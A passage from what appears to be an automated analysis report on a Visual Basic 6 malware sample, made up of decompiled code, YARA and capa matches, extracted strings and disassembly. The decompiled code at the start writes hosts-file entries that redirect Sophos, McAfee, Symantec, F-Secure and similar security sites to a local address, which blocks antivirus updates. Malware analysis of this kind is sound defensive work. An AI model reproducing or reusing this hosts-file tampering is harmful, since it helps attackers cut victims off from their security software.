    (*pcVar2)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);
    sub_40b640("127.0.2.5\\tsarc.com\\r\\n");
    (*pcVar2)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);
    sub_40b640("127.0.2.5\\twww.sarc.com\\r\\n");
    (*pcVar2)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);
    sub_40b640("127.0.2.5\\twww.sophos.com\\r\\n");
    (*pcVar2)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);
    sub_40b640("127.0.2.5\\tsophos.com\\r\\n");
    (*pcVar2)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);
    sub_40b640("127.0.2.5\\twww.mcafee.com\\r\\n");
    (*pcVar2)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);
    sub_40b640("127.0.2.5\\tmcafee.com\\r\\n");
    (*pcVar2)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);
    sub_40b640("127.0.2.5\\tliveupdate.symantecliveupdate.com\\r\\n");
    (*pcVar2)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);
    sub_40b640("127.0.2.5\\twww.viruslist.com\\r\\n");
    (*pcVar2)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);
    sub_40b640("127.0.2.5\\tviruslist.com\\r\\n");
    (*pcVar2)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__vbaPrintFile)(0x403780, uVar3);
    (*msvbvm60.__vbaFreeStrList)(2, auStack_30, &uStack_34);
    sub_40b640("127.0.2.5\\tf-secure.com\\r\\n");
    (*pcVar2)();
    uStack_34 = 0;
    uVar3 = (*pcVar2)();
    uVar3 = (*pcVar1)(uVar3);
    (*msvbvm60.__v
```

### Carved Files (12)
| Name | Type | Size |
|---|---|---|
| ? | DIB | 744 |
| ? | DIB | 296 |
| ? | DIB | 1736 |
| ? | DIB | 1864 |
| ? | DIB | 2216 |
| ? | DIB | 3240 |
| ? | DIB | 1128 |
| ? | DIB | 2440 |
| ? | DIB | 4264 |
| ? | DIB | 9640 |
| ? | DIB | 744 |
| ? | DIB | 296 |

### Virtual Files (14)
| Path / Name | Unpacked Size | Type |
|---|---|---|
| ICO/1/unk | 1736 | - |
| ICO/2/unk | 1864 | - |
| ICO/3/unk | 2216 | - |
| ICO/4/unk | 3240 | - |
| ICO/5/unk | 1128 | - |
| ICO/6/unk | 2440 | - |
| ICO/7/unk | 4264 | - |
| ICO/8/unk | 9640 | - |
| ICO/30001/unk | 744 | - |
| ICO/30002/unk | 296 | - |
| GRPICO/1/unk | 118 | - |
| VER/1/en-us | 1500 | - |
| 32/4000/en-us | 434186 | - |
| 32/5000/en-us | 752 | - |

### Structures (98)
| Name | EA |
|---|---|
| MZ | 0 |
| RichHeader | 128 |
| PE | 192 |
| OptionalHeader | 216 |
| Sections | 440 |
| BoundImportTable | 560 |
| BoundImportNames | 600 |
| kernel32.FT | 4096 |
| user32.FT | 4112 |
| msvbvm60.FT | 4120 |
| VBExternalTable | 6220 |
| VBObj.Module1 | 6252 |
| VBObj.Module14 | 6308 |
| VBObj.Module2 | 6364 |
| VBObj.Module3 | 6420 |
| VBObj.Module4 | 6476 |
| VBObj.Module13 | 6532 |
| VBObj.Module6 | 6588 |
| VBObj.Module5 | 6644 |
| VBObj.Module9 | 6700 |
| VBObj.Module10 | 6756 |
| VBObj.Module11 | 6812 |
| VBObj.Module12 | 6868 |
| VBObj.Module8 | 6924 |
| VBObj.Module8.Methods | 6980 |
| VBObj.Module7 | 6984 |
| VBObj.Module7.Methods | 7040 |
| VBHeader | 7048 |
| VBForms | 7196 |
| VBObj.Form1 | 7356 |


## capa Capability Rules
engine: `malcat-capa` · Total rules: 3 · duration_s: 0.99

| Rule | ATT&CK | MBC |
|---|---|---|
| compress data via WinAPI | T1560.002:Archive Collected Data | C0024:Compress Data |
| link function at runtime on Windows | T1129:Shared Modules |  |
| compiled from Visual Basic |  |  |

## PE Imports / Signals
import_count: 103

| label | api_match | ATT&CK |
|---|---|---|
| load_library | LoadLibrary | T1129 |
| get_proc_address | GetProcAddress | T1129 |

## YARA Matches (pipeline)
Total matches: 17

| Rule | Namespace | Match strings (trimmed) |
|---|---|---|
| domain | - | $domain_regex@0 len=2 |
| IP | - | $ipv4@14148 len=18; $ipv6@204309 len=2 |
| contains_base64 | - | $a@8290 len=12 |
| Dropper_Strings | - | $a0@18868 len=36 |
| Misc_Suspicious_Strings | - | $a1@525839 len=5; $a4@525752 len=7; $a6@14090 len=52 |
| url | - | $url_regex@525821 len=351 |
| IsPE32 | - |  |
| IsWindowsGUI | - |  |
| HasOverlay | - |  |
| HasRichSignature | - | $a0@168 len=4 |
| Microsoft_Visual_Basic_v50v60 | - | $a@6140 len=20 |
| Microsoft_Visual_Basic_v50 | - | $a@79 len=1; $b@6147 len=20 |
| Microsoft_Visual_Basic_v50_v60 | - | $c@6140 len=19 |
| Microsoft_Visual_Basic_v50_additional | - | $a@6140 len=20 |
| Microsoft_Visual_Basic_v50v60_additional | - | $a@6140 len=20 |
| SEH__vba | - | $@53834 len=16 |
| SEH_Init | - | $b@21314 len=7 |

## Generated YARA Meta
```json
{
  "rule_count": 17,
  "matches": [
    {
      "rule": "domain",
      "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
      "strings": [
        {
          "id": "$domain_regex",
          "offset": 0,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IP",
      "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
      "strings": [
        {
          "id": "$ipv4",
          "offset": 14148,
          "length": 18,
          "xor_key": null
        },
        {
          "id": "$ipv6",
          "offset": 204309,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "contains_base64",
      "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
      "strings": [
        {
          "id": "$a",
          "offset": 8290,
          "length": 12,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Dropper_Strings",
      "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
      "strings": [
        {
          "id": "$a0",
          "offset": 18868,
          "length": 36,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Misc_Suspicious_Strings",
      "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
      "strings": [
        {
          "id": "$a1",
          "offset": 525839,
          "length": 5,
          "xor_key": null
        },
        {
          "id": "$a4",
          "offset": 525752,
          "length": 7,
          "xor_key": null
        },
        {
          "id": "$a6",
          "offset": 14090,
          "length": 52,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "url",
      "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
      "strings": [
        {
          "id": "$url_regex",
          "offset": 525821,
          "length": 351,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IsPE32",
      "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
      "strings": []
    },
    {
      "rule": "IsWindowsGUI",
      "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
      "strings": []
    },
    {
      "rule": "HasOverlay",
      "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
      "strings": []
    },
    {
      "rule": "HasRichSignature",
      "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
      "strings": [
        {
          "id": "$a0",
          "offset": 168,
          "length": 4,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Microsoft_Visual_Basic_v50v60",
      "path": "/opt/samples/corpus/incoming/8059ade0d39e4c82cbb94e8d1e1bc92436dd613009a69275f86fe256852a9075/virussign.com_780d28e33c39a8513613918671ac0b78.vir",
      "strings": [
        {
          "id": "$a",
          "offset": 6140,
          "length": 20,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Microsoft_Visual_Basic_v50",
      "path": "/opt/samples/corpus/incoming
```

## FLOSS Strings
Total strings: 1249 · per_category: `{"decoded_strings": 0, "stack_strings": 0, "tight_strings": 0, "language_strings": 0, "language_strings_missed": 0, "static_strings": 1249}`

### High-signal FLOSS
- `kernel32.dll`
- `GetProcAddress`
- `LoadLibraryA`

### FLOSS sample
- `!This program cannot be run in DOS mode.`
- ``.data`
- `kernel32.dll`
- `NTDLL.DLL`
- `user32.dll`
- `MSVBVM60.DLL`
- `Project1`
- `Payload`
- `COMDLG32.OCX`
- `MSComDlg.CommonDialog`
- `CommonDialog`
- `Module1`
- `Module2`
- `Module3`
- `Module4`
- `Module5`
- `Module6`
- `Module7`
- `Module8`
- `Module9`
- `Module10`
- `Module11`
- `Module12`
- `Module13`
- `Module14`
- `C:\Program Files (x86)\Microsoft Visual Studio\VB98\VB6.OLB`
- `VBA6.DLL`
- `__vbaErrorOverflow`
- `__vbaAryDestruct`
- `__vbaUbound`
- `__vbaFreeStrList`
- `__vbaStrI4`
- `__vbaUI1I2`
- `__vbaFreeVar`
- `__vbaFreeStr`
- `__vbaStrMove`
- `__vbaUI1I4`
- `__vbaGenerateBoundsError`
- `__vbaI4Str`
- `__vbaLenBstr`

## .NET Analysis
- is_dotnet: false (not observed)

## radare2 Disassembly (attach in Static Code Analysis)
### 0x004017fc
```asm
┌ 125: entry0 ();
│           0x004017fc      68881b4000     push 0x401b88
│           0x00401801      e8f0ffffff     call 0x4017f6
│           0x00401806      0000           add byte [eax], al
│           0x00401808      0000           add byte [eax], al
│           0x0040180a      0000           add byte [eax], al
│           0x0040180c      3000           xor byte [eax], al
│           0x0040180e      0000           add byte [eax], al
│           0x00401810      40             inc eax
│           0x00401811      0000           add byte [eax], al
│           0x00401813      0000           add byte [eax], al
│           0x00401815      0000           add byte [eax], al
│           0x00401817      0034ab         add byte [ebx + ebp*4], dh
│           0x0040181a      006cda2f       add byte [edx + ebx*8 + 0x2f], ch
│           0x0040181e      ec             in al, dx
│           0x0040181f      44             inc esp
│           0x00401820      81e1e1da20b8   and ecx, 0xb820dae1
│           0x00401826      55             push ebp
│           0x00401827      f20000         add byte [eax], al
│           0x0040182a      0000           add byte [eax], al
│           0x0040182c      0000           add byte [eax], al
│           0x0040182e      0100           add dword [eax], eax
│           0x00401830      0000           add byte [eax], al
│           0x00401832      2000           and byte [eax], al
│           0x00401834      0000           add byte [eax], al
│           0x00401836      40             inc eax
│           0x00401837      005072         add byte [eax + 0x72], dl
│           0x0040183a      6f             outsd dx, dword [esi]
│           0x0040183b      6a65           push 0x65                   ; 'e' ; 101
│           0x0040183d      63743100       arpl word [ecx + esi], si
│           0x00401841      008002000000   add byte [eax + 2], al
│           0x00401847      0000           add byte [eax], al
│           0x00401849      0000           add byte [eax], al
│           0x0040184b      0006           add byte [esi], al
│           0x0040184d      0000           add byte [eax], al
│           0x0040184f      00e4           add ah, ah
│           0x00401851      324000         xor al, byte [eax]
│           0x00401854      07             pop es
│           0x00401855      0000           add byte [eax], al
│           0x00401857      00c0           add al, al
│           0x00401859      304000         xor byte [eax], al
│           0x0040185c      07             pop es
│           0x0040185d      0000           add byte [eax], al
│           0x0040185f      004c3040       add byte [eax + esi + 0x40], cl
│           0x00401863      0007           add byte [edi], al
│           0x00401865      0000           add byte [eax], al
│           0x00401867      00fc           add ah, bh
│           0x00401869      2f             das
│           0x0040186a      40             inc eax
│           0x0040186b      0001           add byte [ecx], al
```
### 0x00401018
```asm
┌ 1364: sym.imp.MSVBVM60.DLL___vbaVarTstGt ();
│ ╎╎╎╎╎╎╎   0x00401018      41             inc ecx
│ ╎╎╎╎╎╎╎   0x00401019      98             cwde
│ ╎╎╎╎╎╎╎   0x0040101a      a4             movsb byte es:[edi], byte [esi]
│ ╎╎╎╎╎╎└─< 0x0040101b  ~   7286           jb 0x400fa3
│ ╎╎╎╎╎╎    ;-- _CIcos:
..
│ ╎╎╎╎╎╎    0x0040101d      93             xchg ebx, eax
│ ╎╎╎╎╎╎    0x0040101e  ~   a372f909a3     mov dword [0xa309f972], eax ; [0xa309f972:4]=-1
│ ╎╎╎╎╎╎    ;-- _adj_fptan:
..
│ └───────< 0x00401023  ~   72ee           jb 0x401013
│  ╎╎╎╎╎    ;-- __vbaVarMove:
..
│  ╎╎╎╎╎    0x00401025      6aa4           push 0xffffffffffffffa4
│  ╎╎╎╎╎┌─< 0x00401027  ~   7237           jb sym.imp.MSVBVM60.DLL_rtcGetObject
│  ╎╎╎╎╎│   ;-- __vbaStrI4:
..
│  ╎╎╎╎╎│   ;-- (0x0040102c) __vbaVarVargNofree:
│  ╎╎╎╎╎│   0x00401029  ~   05a2728d72     add eax, 0x728d72a2
│  ╎╎╎╎╎│   0x0040102e      a4             movsb byte es:[edi], byte [esi]
│ ┌───────< 0x0040102f  ~   7244           jb 0x401075
│ │╎╎╎╎╎│   ;-- __vbaAryMove:
..
│ │╎╎╎╎╎│   0x00401031      c2a072         ret 0x72a0
..
│ │╎╎╎╎╎│   ;-- (0x0040103c) __vbaStrVarMove:
│ │╎╎╎╎╎│   ;-- __vbaLenBstr:
│ │╎╎╎╎ │   ;-- (0x00401048) __vbaPut3:
└ │╎╎╎╎┌──> 0x0040104e      a4             movsb byte es:[edi], byte [esi]
│ │╎╎│╎╎│   ;-- (0x00401050) _adj_fdiv_m64:
│ │╎╎└────< 0x0040104f  ~   72ba           jb 0x40100b
│ │╎╎ ╎╎│   ;-- (0x00401054) __vbaNextEachVar:
│ │╎╎ ╎╎│   0x00401051  ~   02a372bc63a4   add ah, byte [ebx - 0x5b9c438e]
│ │└──────< 0x00401057  ~   72b7           jb sym.imp.user32.dll_CallWindowProcA
│ │ ╎ ╎╎│   ;-- rtcAnsiValueBstr:
..
│ │ ╎ └───< 0x00401059      70a2           jo 0x400ffd
│ │ ╎  ╎│   ;-- (0x0040105c) _adj_fprem1:
│ │ ╎ ┌───< 0x0040105b  ~   7241           jb 0x40109e
│ │ ╎ │╎│   0x0040105d  ~   09a372ca9ca1   or dword [ebx - 0x5e63358e], esp
│ │ ╎ │╎│   ;-- rtcGetObject:
│ │ ╎ │╎└─> 0x00401060      ca9ca1         retf 0xa19c
│ │ ╎ │╎    ;-- (0x00401064) __vbaStrCat:
│ │ ╎┌──┌─> 0x00401063  ~   7276           jb 0x4010db
│ │ ╎││╎╎   0x00401065      6aa2           push 0xffffffffffffffa2
│ │ ╎││└──< 0x00401067  ~   72e5           jb 0x40104e
│ │ ╎││ ╎   ;-- __vbaLsetFixstr:
..
│ │ └─────< 0x00401069      76a2           jbe 0x40100d
│ │  ││ ╎   ;-- (0x0040106c) __vbaSetSystemError:
│ │  ││┌──< 0x0040106b  ~   723a           jb 0x4010a7
│ │  │││╎   0x0040106d      c3             ret
..
│ │ ││││╎   ;-- (0x00401078) __vbaAryVar:
│ └───────> 0x00401075  ~   02a3724039a4   add ah, byte [ebx - 0x5bc6bf8e]
│   ││││╎   ;-- (0x0040107c) __vbaAryDestruct:
│   ──────> 0x0040107b  ~   72fe           jb 0x40107b
│   ││││╎   0x0040107d  ~   c1a172cc93..   shl dword [ecx - 0x5b6c338e], 0x72
│   ││││╎   ;-- __vbaVarForInit:
│  ┌──────> 0x00401080      cc             int3
..
│  ╎││││╎   ;-- (0x00401084) rtcRandomNext:
│ ┌───────> 0x00401083  ~   7205           jb 0x40108a
│ ╎╎││││╎   0x00401085  ~   cda1           int 0xa1
│ ╎╎││││╎   ;-- (0x00401088) rtcRandomize:
│ ────────> 0x00401086  ~   a1723acd
```
### 0x00401034
```asm
┌ 28: sym.imp.MSVBVM60.DLL___vbaFreeVar ();
│       ╎   0x00401034      3168a4         xor dword [eax - 0x5c], ebp
│      ┌──< 0x00401037  ~   72ff           jb sym.imp.MSVBVM60.DLL___vbaGosubReturn
│      │╎   ;-- __vbaGosubReturn:
│      └──> 0x00401038      ff             invalid
│       ╎   ;-- (0x0040103c) __vbaStrVarMove:
│       ╎   0x00401039  ~   3ba4722919..   cmp esp, dword [edx + esi*2 + reloc.MSVBVM60.DLL___vbaStrVarMove]
│       ╎   ;-- __vbaLenBstr:
│       ╎   0x00401040      9b             wait
│       ╎   0x00401041      6aa2           push 0xffffffffffffffa2
│       └─< 0x00401043  ~   7288           jb 0x400fcd
│           ;-- __vbaEnd:
..
│           ;-- (0x00401048) __vbaPut3:
│           0x00401045  ~   bea072fa56     mov esi, 0x56fa72a0
└           0x0040104a  ~   a2726272a4     mov byte [0xa4726272], al   ; [0xa4726272:1]=255
│           ;-- __vbaFreeVarList:
..
```
### 0x00401070
```asm
┌ 22: sym.imp.MSVBVM60.DLL___vbaHresultCheckObj (int32_t arg_40h);
│      ╎│   ; arg int32_t arg_40h @ ebp+0x40
│      ╎└─< 0x00401070      74a2           je 0x401014
│      ╎    ;-- (0x00401074) _adj_fdiv_m32:
│      ╎    0x00401072  ~   a1726e02a3     mov eax, dword [0xa3026e72] ; [0xa3026e72:4]=-1
│      ╎    ;-- (0x00401078) __vbaAryVar:
..
│      ╎┌─< 0x00401077  ~   7240           jb 0x4010b9
│      ╎│   ;-- __vbaAryVar:
..
│      ╎│   0x00401079  ~   39a472fec1..   cmp dword [edx + esi*2 + reloc.MSVBVM60.DLL___vbaAryDestruct], esp
│      ╎│   ;-- (0x0040107c) __vbaAryDestruct:
..
│   │╎╎╎│   ;-- rtcRandomNext:
│ │╎ ╎╎╎│   ;-- (0x0040108c) rtcMsgBox:
│ │╎│╎╎╎│   ;-- (0x00401094) _adj_fdiv_m16i:
│ │╎│╎╎╎│   ;-- (0x0040109c) _adj_fdivr_m16i:
│ │╎│╎╎╎│   ;-- (0x004010a0) __vbaVarTstLt:
│ │╎│╎╎╎│   ;-- (0x004010a4) _CIsin:
│ │╎│╎╎╎│   ;-- (0x004010b8) __vbaGosubFree:
│ │╎│╎╎╎└─> 0x004010b9  ~   3ca4           cmp al, 0xa4                ; 164
..
│ │╎ ╎╎╎╎   ;-- (0x004010c4) __vbaGenerateBoundsError:
│  ╎││╎ ╎   ;-- (0x004010d4) __vbaAryConstruct2:
│  │  ╎ ╎   ;-- (0x004010dc) __vbaObjVar:
│     ╎╎╎   ;-- (0x004010e8) __vbaRedimPreserve:
│    │╎╎╎   ;-- (0x004010ec) _adj_fpatan:
│  ╎││ │╎   ;-- (0x00401100) __vbaUI1I2:
│  ╎ │  ╎   ;-- __vbaExceptHandler:
```
### 0x004010d8
```asm
┌ 7: sym.imp.MSVBVM60.DLL___vbaCyI4 (int32_t arg_40h);
│           ; arg int32_t arg_40h @ ebp+0x40
│           0x004010d8      b119           mov cl, 0x19                ; 25
└           0x004010da  ~   a272a9a1a1     mov byte [0xa1a1a972], al   ; [0xa1a1a972:1]=255
│           ;-- (0x004010dc) __vbaObjVar:
..
```

## UPX Unpack
- upx_ok: False
- is_packed: False
- returncode: None
- unpacked_path: ``

## XOR Search
- Found XOR 00 position 00000000: 000000C0 ........!..L.!This program cannot be r

## Speakeasy (dynamic)
- speakeasy_ok: True
- api_calls: 0
- key_events: 0
- duration_s: None
- **not observed**: no API calls/events recorded — do not invent runtime behavior

## Frida Probe
- frida_available: True
- version: 17.16.4
